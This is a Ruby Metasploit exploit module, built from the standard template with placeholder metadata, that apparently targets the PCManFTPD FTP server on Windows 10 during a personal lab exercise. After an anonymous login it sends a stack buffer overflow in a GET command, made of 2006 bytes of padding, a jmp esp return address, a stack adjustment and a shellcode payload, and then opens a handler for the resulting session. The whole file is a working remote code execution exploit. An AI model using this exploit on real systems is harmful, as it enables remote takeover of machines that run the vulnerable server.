##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  #Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking
  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'insert name for the exploit',
      'Description'  => %q{
          Provide information about the vulnerability / explain as good as you can
          Make sure to keep each line less than 100 columns wide
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'insert_name_of_person_who_discovered_the_vulnerability<user[at]domain.com>',  # Original discovery
          '<insert your name here>',  # MSF Module
        ],
      'References'  =>
        [
          [ 'OSVDB', '<insert OSVDB number here>' ],
          [ 'CVE', 'insert CVE number here' ],
          [ 'URL', '<insert another link to the exploit/advisory here>' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process', #none/process/thread/seh
          #'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'  => 'win',
      'Payload'  =>
        {
          'BadChars' => "\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d", # <change if needed>
          'DisableNops' => true,
        },

      'Targets'    =>
        [
          [ 'Roy\'s Windows10',
            {
              'Ret'     =>  0x0043410d, # jmp esp - PCManFTPD2.exe
              'Offset'  =>  2006
            }
          ],
        ],
      'Privileged'  => false,
      #Correct Date Format: "M D Y"
      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec
      'DisclosureDate'  => 'MONTH DAY YEAR',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(4444)], self.class)

  end

  def exploit


    connect
#my own test code
sock.recv(1024)
sock.put('USER anonymous')
sock.recv(1024)
sock.put('PASS anonymous')
sock.recv(1024)

    buffer =  'GET '
    buffer << rand_text(target['Offset'])  
    buffer << [target.ret].pack('V')  
    buffer << rand_text(4)  #junk
    buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, 'add esp,-1500').encode_string # avoid GetPC shellcode corruption
    buffer << payload.encoded  #max 2072 bytes

    print_status("Trying target #{target.name}...")
    sock.put(buffer)
	#send_cmd(['GET ' + buffer],false)

    handler
    disconnect

  end
end
